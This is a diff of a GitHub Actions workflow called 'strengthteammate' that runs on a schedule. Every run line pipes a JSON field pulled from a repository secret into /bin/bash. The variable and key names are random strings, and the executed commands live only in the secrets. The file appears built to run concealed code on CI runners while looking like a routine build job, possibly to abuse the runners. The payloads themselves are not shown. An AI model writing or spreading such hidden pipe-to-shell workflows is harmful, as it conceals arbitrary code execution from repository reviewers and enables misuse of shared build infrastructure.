@@ -3,43 +3,26 @@ name: strengthteammate
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 3/6 * * *'
+    - cron: '44 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: strengthteammate
         env:
-          minj370: ${{ secrets.minj370 }}
+          xcx19: ${{ secrets.xcx19 }}
         run: |
-          echo $minj370 | jq -r .qol39997 | /bin/bash
-          echo $yiv5 | jq -r .hum84 | /bin/bash
-          echo $u40 | jq -r .ne555 | /bin/bash
-          echo $gvfga06170 | jq -r .jkln4 | /bin/bash
-          echo $ymrm06 | jq -r .qnis4 | /bin/bash
-          echo $xux97 | jq -r .tou40474 | /bin/bash
-          echo $m42 | jq -r .jnack0179 | /bin/bash
-          echo $j16 | jq -r .dwqy0317 | /bin/bash
-          echo $syve89 | jq -r .u5 | /bin/bash
-          echo $jzgl29110 | jq -r .blm508 | /bin/bash
-          echo $jcn11146 | jq -r .y69271 | /bin/bash
-          echo $s78 | jq -r .iymh1526 | /bin/bash
-          echo $lpw207 | jq -r .kjk74901 | /bin/bash
-          echo $ikpua75 | jq -r .vvzq7 | /bin/bash
-          echo $n08183 | jq -r .hxdvu9715 | /bin/bash
-          echo $p51520 | jq -r .mqw7178 | /bin/bash
-          echo $xf4621 | jq -r .fj0888 | /bin/bash
-          echo $o2731 | jq -r .imipp697 | /bin/bash
-          echo $wrvc1 | jq -r .yuujp13637 | /bin/bash
-          echo $hyr8438 | jq -r .uhkn6 | /bin/bash
-          echo $pvy9 | jq -r .qxnxo79 | /bin/bash
-          echo $dptv104 | jq -r .m3 | /bin/bash
-          echo $efo1 | jq -r .zlguy59 | /bin/bash
-          echo $demn5286 | jq -r .uik4 | /bin/bash
-          echo $j91 | jq -r .t1134 | /bin/bash
-          echo $bqb1 | jq -r .bua7197 | /bin/bash
-          echo $z4666 | jq -r .xdrxx85937 | /bin/bash
-          echo $snsdb4 | jq -r .mdoe21394 | /bin/bash
+          echo $xcx19 | jq -r .at27 | /bin/bash
+          echo $gfty4 | jq -r .qt364 | /bin/bash
+          echo $r67 | jq -r .fymeu56 | /bin/bash
+          echo $rnjj3 | jq -r .ov2 | /bin/bash
+          echo $j85805 | jq -r .tjw94947 | /bin/bash
+          echo $thbzv5 | jq -r .v23612 | /bin/bash
+          echo $gecl1 | jq -r .sieo0 | /bin/bash
+          echo $lr88 | jq -r .l6 | /bin/bash
+          echo $dgs8 | jq -r .vuk1441 | /bin/bash
+          echo $hzikf6642 | jq -r .sd2491 | /bin/bash
 
